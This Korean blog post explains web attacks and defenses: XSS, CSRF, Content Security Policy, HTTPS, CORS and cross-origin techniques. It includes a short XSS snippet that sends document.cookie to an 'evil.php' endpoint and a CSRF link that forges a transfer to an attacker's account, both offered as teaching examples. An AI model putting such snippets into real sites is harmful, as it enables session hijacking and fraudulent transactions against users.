---
title: "웹 보안"
date: "2021-06-03"

---

개방형 웹 앱에서는 보안을 확인하는 것이 중요하다. 유저의 개인정보가 유출될수도 있고, 인터넷 은행 같은 서비스에서는 자산적 피해로 이어질 수 있다. 그래서 이 포스트에선 **웹 공격**과 **웹 보안**에 대해 알아보고자 한다.

## 웹 공격

웹 공격에는 대표적으로 두 가지가 있다. 

- [XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting): 세션 하이재킹을 통해 서버와 요청 응답을 주고 받는 공격

```html
<--! 다음과 같은 코드를 공격 웹 사이트에 심어놓음으로 인해 cookie를 evil.php로 전송하여 탈취 -->
<SCRIPT type="text/javascript">
	var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

- [CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF): 인증된 사용자를 통해 원하는 요청을 전송하는 공격

```html
<--! www.example.com/transfer이 송금이고 공격받는 사용자가 인증되었다고 가정했을 때 -->
<--! input 검사를 하지 않는 FAQ 같은 곳에 삽입할 수 있을 것이다. -->
<a href="www.example.com/transfer?account=attackerAccount&amount=$100">자세히 알아보기</a>
```



## 콘텐츠 보안 정책(CSP)

CSP는 XSS처럼 데이터를 삽입해 공격을 하는 막는 보안 계층이다.

일반적으로  [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) 헤더를 사용하고, `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">` 이와 같이 meta 태그로 설정할 때도 있다.

가장 중요한 값은 default-src 인데, 이는 인라인 스크립트와 스타일이 실행되는 것을 방지한다. 아래 몇가지 예를 보면서 뜻을 알아보자.

예1) 모든 콘텐츠가 사이트 고유의 출처에서 제공되기를 원함.

```
Content-Security-Policy: default-src 'self'
```

예2) 이미지는 모든 곳에서 제공될 수 있지만, 스크립트는 지정된 서버에서만 허용.

```
Content-Security-Policy: default-src 'self'; img-src *; script-src userscripts.example.com
```

이처럼 리소스 출처에 제한을 두면서 공격에 대처하는 방법이다.

## 연결 보안

### HTTPS

SSL 프로토콜을 이용하여 비공개로 정보를 교환할 수 있게 한다. SSL을 통해 인증서를 발급하고 클라이언트는 브라우저의 CA리스트를 확인하여 서버가 믿을 수 있는 서버인지 확인한다. 

클라이언트, 서버에서 각각 난수를 생성하고 그걸 이용하여 서버에서 세션키를 생성.

세션키를 대칭키로 이용해서 데이터 송수신.

세션 종료 시 세션키를 폐기한다.``

## CORS

[SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)에 의해 같은 프로토콜, 호스트, 포트에 의해서 문서나 스크립트를 가져오게 된다. 이 때 다른 도메인로 요청하려는 경우가 생기는데 이때 사용하는 방법이 CORS이다.

먼저 CORS는 아래의 두가지 경우로 나뉜다.

### Simple request

1. HTTP Method: GET, HEAD(GET으로 요청했을 때 반환하는 헤더를 요청), POST

2. HTTP Header: User Agent가 자동으로 설정한 헤더외에 수동으로 설정할 수 있는 헤더는 Fetch 명세의 ["CORS-safelisted request-header"](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)

3. Conent-Type Header: 다음 값들만 허용

   - `application/x-www-form-urlencoded`

   - `multipart/form-data`
   - `text/plain`

조건은 위의 3개를 다 만족해야 하고 이 경우엔 서버에서 설정한 **Access-Control-Allow-Origin** 헤더의 값만 충족한다면 도메인이 다르더라도 리소스를 받을 수 있다.

### Preflight Request

simple request를 제외한 모든 요청은 다 이 경우에 해당한다. 이 때는 요청 응답을 받는 프로세스가 달라지는데,

먼저, OPTIONS 메소드로 서버에서 허용하고 있는 아래의 4가지 값을 확인한다.

- Access-Control-Allow-Origin
- Access-Control-Allow-Methods
- Access-Control-Allow-Headers
- Access-Control-Max-Age

그리고 클라이언트에서 보낸 요청이 조건 중 상위 3가지의 응답을 충족하는지 확인하고, 한다면 본래의 요청을 다시 보내 응답을 받고 충족하지 못한다면 브라우저가 CORS error를 뱉는다. 이 때 마지막 `Access-Control-Max-Age` 는 preflight request의 캐시 시간이다.

## CORS외에 다른 도메인으로 리소스를 요청하는 방법

### postMessages

Window object간에 메세지를 통신할 수 있게 한다.

```javascript
// popup 여는 쪽 Origin: http://example.com:8080
var popup = window.open('http://www.example.com')
popup.postMessage("hi there", 'http://www.example.com')
```

```javascript
// 메세지 받는 쪽 Origin: http://www.example.com
function receiveMessage(event)
{
  // Do we trust the sender of this message?
  if (event.origin !== "http://example.com:8080") return;
  event.source.postMessage(
    "hi there yourself!  the secret response " + "is: rheeeeet!", event.origin
  );               
}

window.addEventListener("message", receiveMessage, false);
```

### JSONP

XHR 객체를 사용하지 않고 `<script>` 태그를 사용하는 방법

콜백함수를 반환해서 클라이언트에 있는 콜백함수를 실행하게 함

```html
<script src="demo_jsonp.php">
  // response example: myFunction({name: "John", age: 30})
```

만약 클라이언트의 콜백을 예측할 수 없다면? 그 땐 서버 파일에서 파라미터를 콜백이름으로 받아 그대로 리턴해줄 수 있다.

```html
<script src="jsonp_demo_db.php?callback=myDisplayFunction"></script>
```

### xDomain

서버에는 proxy.html 만 생성하고 

```html
<--! http://www.server.com의 proxy.html -->
  <!DOCTYPE HTML>
<script src="//unpkg.com/xdomain@0.8.2/dist/xdomain.min.js" master="http://www.client.com"></script>

```

클라이언트에는 slave 속성만 설정해준다.

```html
<--! // xdomain package도 포함하고 있어야 함, http://www.client.com -->
<script src="//unpkg.com/xdomain@0.8.2/dist/xdomain.min.js" slave="http://www.server.com/proxy.html"></script>
```

요청할 땐 xhr을 사용한다.

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.server.com/secret/file.txt");
```